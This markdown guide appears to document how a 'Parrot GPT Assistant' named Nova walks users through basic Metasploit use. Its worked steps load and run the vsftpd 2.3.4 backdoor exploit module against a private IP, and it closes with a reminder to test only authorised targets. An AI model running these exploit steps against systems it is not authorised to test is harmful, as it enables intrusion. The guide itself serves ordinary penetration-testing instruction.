guides/metasploit.md

# 🛠️ Metasploit Basics Guide with Parrot GPT Assistant

## What is Metasploit?

Metasploit is a powerful penetration testing framework used to find, exploit, and validate vulnerabilities. It contains a wide range of exploits, payloads, and auxiliary modules.

---

## Using Metasploit with Parrot GPT Assistant

Nova can help you construct Metasploit commands and guide you through using common modules. For example, you can ask:

> "How do I start Metasploit and run a basic exploit?"

Nova will suggest commands and explain their usage step-by-step.

---

## Common Metasploit Commands

### 1. Start the Metasploit console
```bash
msfconsole

<!-- [ADD SCREENSHOT: Nova suggesting msfconsole command] -->
2. Search for an exploit

search vsftpd

<!-- [ADD SCREENSHOT: Nova suggesting search command] -->
3. Use an exploit module

use exploit/unix/ftp/vsftpd_234_backdoor

<!-- [ADD SCREENSHOT: Nova showing 'use' command suggestion] -->
4. Set required options (e.g., target IP)

set RHOST 192.168.1.10

<!-- [ADD SCREENSHOT: Nova suggesting set command] -->
5. Run the exploit

exploit

<!-- [ADD SCREENSHOT: Nova suggesting exploit command] -->
How to Ask Nova

Examples:

    "Open Metasploit console"

    "Search for ftp exploits"

    "Use vsftpd backdoor exploit"

    "Set target IP to 10.0.0.5"

    "Run exploit"

Nova will reply with suggested commands and explanations.
Ethical Reminder

Only use Metasploit against targets you have permission to test.
Tips

    Use help inside msfconsole for detailed module commands

    Combine Metasploit with Nmap scans for better target information

